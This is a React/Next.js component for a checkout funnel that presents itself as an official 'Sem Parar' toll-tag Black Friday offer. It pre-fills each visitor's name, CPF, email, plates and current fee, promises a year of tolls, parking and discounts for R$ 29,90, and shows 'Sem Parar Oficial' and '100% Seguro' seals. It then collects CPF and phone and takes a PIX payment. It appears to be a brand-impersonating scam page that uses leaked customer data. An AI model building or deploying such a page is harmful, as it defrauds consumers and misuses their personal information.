'use client';

import { useState, useEffect } from 'react';
import Image from 'next/image';

interface LeadData {
  nrc: number;
  nome: string;
  firstName: string;
  email: string;
  cpf: string;
  cidade: string;
  estado: string;
  placas: string[];
  tags: string[];
  planos: string[];
  qtdVeiculos: number;
  situacao: number;
  mensalidadeAtual: number;
}

interface PixData {
  id: string;
  qrCodeBase64: string;
  copyPaste: string;
  amount: number;
  expiresAt: string;
}

export default function FunnelClient({ lead }: { lead: LeadData }) {
  const [step, setStep] = useState<'offer' | 'checkout' | 'success'>('offer');
  const [loading, setLoading] = useState(false);
  const [pixData, setPixData] = useState<PixData | null>(null);
  const [paymentStatus, setPaymentStatus] = useState<'pending' | 'paid'>('pending');
  const [copied, setCopied] = useState(false);
  const [formData, setFormData] = useState({
    cpf: lead.cpf || '',
    telefone: '',
    placa: lead.placas[0] || '',
    paymentMethod: 'pix',
  });

  const promoPrice = 29.90;
  const mensalidadeAtual = lead.mensalidadeAtual || 49.90;

  const handleCopyPix = () => {
    if (pixData?.copyPaste) {
      navigator.clipboard.writeText(pixData.copyPaste);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  const handleConfirm = async () => {
    if (!formData.cpf) return;

    setLoading(true);
    try {
      const response = await fetch('/api/pix', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          nrc: lead.nrc,
          name: lead.nome,
          email: lead.email,
          cpf: formData.cpf,
          amount: promoPrice,
        }),
      });

      if (!response.ok) throw new Error('Falha ao gerar PIX');

      const pix = await response.json();
      setPixData(pix);
    } catch (error) {
      alert('Erro ao gerar pagamento. Tente novamente.');
      console.error(error);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (!pixData?.id || paymentStatus !== 'pending') return;

    const checkStatus = async () => {
      try {
        const response = await fetch(`/api/pix?id=${pixData.id}`);
        const data = await response.json();
        if (data.status === 'paid' || data.status === 'approved' || data.status === 'completed') {
          setPaymentStatus('paid');
          setStep('success');
        }
      } catch (error) {
        console.error('Error checking payment:', error);
      }
    };

    const interval = setInterval(checkStatus, 5000);
    return () => clearInterval(interval);
  }, [pixData?.id, paymentStatus]);

  const brandColor = '#B91244';

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Header */}
      <header className="bg-white border-b border-[#e6e6e6]">
        <div className="max-w-[500px] mx-auto px-4 py-3 flex items-center justify-center">
          <Image src="/logo.png" alt="Sem Parar" width={100} height={28} className="h-7 w-auto" />
        </div>
      </header>

      {/* PASSO 2: Pagina da Oferta */}
      {step === 'offer' && (
        <main className="flex-1 max-w-[500px] mx-auto px-4 py-6 w-full">
          {/* Card principal */}
          <div className="border border-[#e6e6e6] rounded-2xl p-6">
            {/* Badge */}
            <div className="text-center mb-4">
              <span
                className="inline-block text-white text-xs font-semibold px-4 py-1.5 rounded-full"
                style={{ backgroundColor: brandColor }}
              >
                OFERTA EXCLUSIVA
              </span>
            </div>

            {/* Titulo */}
            <h1 className="text-[#0e0d0d] text-xl font-bold text-center mb-4">
              {lead.firstName.toUpperCase()}, VOCE FOI SELECIONADO!
            </h1>

            {/* Preco */}
            <div className="text-center mb-2">
              <p className="text-4xl font-bold" style={{ color: brandColor }}>
                R$ {promoPrice.toFixed(2).replace('.', ',')}
              </p>
              <p className="text-[#0e0d0d] text-base mt-1">pelo ano inteiro</p>
              <p className="text-[#666] text-sm mt-1">
                De R$ {mensalidadeAtual.toFixed(2).replace('.', ',')}/mes • 95% de Economia
              </p>
            </div>

            {/* Beneficios Grid 2x2 */}
            <div className="grid grid-cols-2 gap-3 my-6">
              {[
                { icon: '🚗', title: '1 ANO SEM', subtitle: 'PEDAGIO' },
                { icon: '🅿️', title: '1 ANO SEM', subtitle: 'ESTACIONAMENTO' },
                { icon: '🍔', title: '30% OFF', subtitle: "McDONALD'S" },
                { icon: '⛽', title: '-R$ 0,20', subtitle: '/LITRO' },
              ].map((item, i) => (
                <div key={i} className="bg-[#f8f8f8] rounded-xl p-4 text-center">
                  <span className="text-2xl mb-1 block">{item.icon}</span>
                  <p className="text-[#0e0d0d] text-xs font-bold">{item.title}</p>
                  <p className="text-[#0e0d0d] text-xs font-bold">{item.subtitle}</p>
                </div>
              ))}
            </div>

            {/* CTA */}
            <button
              onClick={() => setStep('checkout')}
              className="w-full text-white font-semibold text-sm py-4 rounded-lg transition-colors hover:opacity-90"
              style={{ backgroundColor: brandColor }}
            >
              QUERO APROVEITAR ESTA OFERTA
            </button>
          </div>
        </main>
      )}

      {/* PASSO 3: Checkout */}
      {step === 'checkout' && (
        <main className="flex-1 max-w-[500px] mx-auto px-4 py-6 w-full">
          {/* Card principal */}
          <div className="border border-[#e6e6e6] rounded-2xl p-6">
            {/* Titulo */}
            <h1 className="text-[#0e0d0d] text-lg font-bold text-center mb-6">
              Finalize seu Sem Parar<br/>Black Friday
            </h1>

            {/* Resumo */}
            <div className="bg-[#f8f8f8] rounded-xl p-4 mb-6 flex items-center justify-between">
              <div>
                <p className="text-[#0e0d0d] text-sm font-medium">Plano Anual +</p>
                <p className="text-[#0e0d0d] text-sm font-medium">4 Beneficios Black Friday</p>
              </div>
              <p className="text-[#0e0d0d] text-xl font-bold">R$ {promoPrice.toFixed(2).replace('.', ',')}</p>
            </div>

            {/* Dados Pessoais */}
            <div className="mb-4">
              <p className="text-[#0e0d0d] text-sm font-semibold mb-2">Dados Pessoais</p>
              <div className="grid grid-cols-2 gap-3">
                <input
                  type="text"
                  value={formData.cpf}
                  onChange={(e) => setFormData({ ...formData, cpf: e.target.value })}
                  className="w-full border border-[#e6e6e6] rounded-lg px-3 py-2.5 text-[#0e0d0d] text-sm focus:outline-none focus:border-[#B91244]"
                  placeholder="CPF"
                />
                <input
                  type="text"
                  value={formData.telefone}
                  onChange={(e) => setFormData({ ...formData, telefone: e.target.value })}
                  className="w-full border border-[#e6e6e6] rounded-lg px-3 py-2.5 text-[#0e0d0d] text-sm focus:outline-none focus:border-[#B91244]"
                  placeholder="Telefone"
                />
              </div>
            </div>

            {/* Dados do Veiculo */}
            <div className="mb-4">
              <p className="text-[#0e0d0d] text-sm font-semibold mb-2">Dados do Veiculo</p>
              <input
                type="text"
                value={formData.placa}
                onChange={(e) => setFormData({ ...formData, placa: e.target.value })}
                className="w-full border border-[#e6e6e6] rounded-lg px-3 py-2.5 text-[#0e0d0d] text-sm focus:outline-none focus:border-[#B91244]"
                placeholder="Placa"
              />
            </div>

            {/* Forma de Pagamento */}
            <div className="mb-6">
              <p className="text-[#0e0d0d] text-sm font-semibold mb-2">Forma de Pagamento</p>
              <select
                value={formData.paymentMethod}
                onChange={(e) => setFormData({ ...formData, paymentMethod: e.target.value })}
                className="w-full border border-[#e6e6e6] rounded-lg px-3 py-2.5 text-[#0e0d0d] text-sm focus:outline-none focus:border-[#B91244] bg-white"
              >
                <option value="pix">Pix</option>
                <option value="cartao">Cartao</option>
              </select>
            </div>

            {/* QR Code PIX */}
            {pixData && (
              <div className="bg-[#f8f8f8] rounded-xl p-4 mb-6 text-center">
                {pixData.qrCodeBase64 && (
                  <img src={`data:image/png;base64,${pixData.qrCodeBase64}`} alt="QR Code" className="w-36 h-36 mx-auto mb-3" />
                )}
                <div className="flex gap-2">
                  <code className="flex-1 text-[#0e0d0d] text-xs bg-white border border-[#e6e6e6] rounded-lg p-2 text-left truncate">
                    {pixData.copyPaste}
                  </code>
                  <button
                    onClick={handleCopyPix}
                    className="text-white text-xs font-semibold px-3 py-2 rounded-lg"
                    style={{ backgroundColor: brandColor }}
                  >
                    {copied ? '✓' : 'Copiar'}
                  </button>
                </div>
                <p className="text-[#666] text-xs mt-3 flex items-center justify-center gap-2">
                  <span className="w-2 h-2 bg-[#f59e0b] rounded-full animate-pulse"></span>
                  Aguardando pagamento...
                </p>
              </div>
            )}

            {/* Selos */}
            <div className="flex items-center justify-center gap-4 mb-6 text-xs text-[#666]">
              <span className="flex items-center gap-1">
                <span className="text-green-600">🔒</span> Ambiente 100% Seguro
              </span>
              <span className="flex items-center gap-1">
                <span style={{ color: brandColor }}>✓</span> Sem Parar Oficial
              </span>
            </div>

            {/* CTA */}
            <button
              onClick={handleConfirm}
              disabled={loading || !formData.cpf}
              className="w-full text-white font-semibold text-sm py-4 rounded-lg transition-colors hover:opacity-90 disabled:opacity-50"
              style={{ backgroundColor: brandColor }}
            >
              {loading ? 'Processando...' : `Confirmar e Pagar R$ ${promoPrice.toFixed(2).replace('.', ',')}`}
            </button>
          </div>

          <button
            onClick={() => setStep('offer')}
            className="w-full text-[#666] text-sm py-3 hover:text-[#0e0d0d] transition-colors"
          >
            ← Voltar
          </button>
        </main>
      )}

      {/* PASSO 4: Confirmacao */}
      {step === 'success' && (
        <main className="flex-1 max-w-[500px] mx-auto px-4 py-10 w-full">
          {/* Check icon */}
          <div className="text-center mb-6">
            <div className="w-16 h-16 bg-[#dcfce7] rounded-full flex items-center justify-center mx-auto">
              <span className="text-[#16a34a] text-3xl">✓</span>
            </div>
          </div>

          {/* Titulo */}
          <div className="text-center mb-8">
            <h1 className="text-[#0e0d0d] text-2xl font-bold mb-2">
              Assinatura Confirmada!
            </h1>
            <p className="text-[#666] text-base">
              Beneficios Black Friday Ativos
            </p>
          </div>

          {/* Proximos passos */}
          <div className="space-y-4">
            <div className="flex items-center gap-4 bg-[#f8f8f8] rounded-xl p-4">
              <span className="text-2xl">📦</span>
              <div>
                <p className="text-[#0e0d0d] font-medium text-sm">Envio da TAG para seu endereco</p>
              </div>
            </div>
            <div className="flex items-center gap-4 bg-[#f8f8f8] rounded-xl p-4">
              <span className="text-2xl">📱</span>
              <div>
                <p className="text-[#0e0d0d] font-medium text-sm">Acesso imediato no App Sem Parar</p>
              </div>
            </div>
            <div className="flex items-center gap-4 bg-[#f8f8f8] rounded-xl p-4">
              <span className="text-2xl">✉️</span>
              <div>
                <p className="text-[#0e0d0d] font-medium text-sm">Comprovante enviado por E-mail</p>
              </div>
            </div>
          </div>
        </main>
      )}

      {/* Footer */}
      <footer className="border-t border-[#e6e6e6] py-4 mt-auto">
        <div className="max-w-[500px] mx-auto px-4 text-center">
          <p className="text-[#999] text-xs">
            Sem Parar · DBTrans Internet Ltda.
          </p>
        </div>
      </footer>
    </div>
  );
}
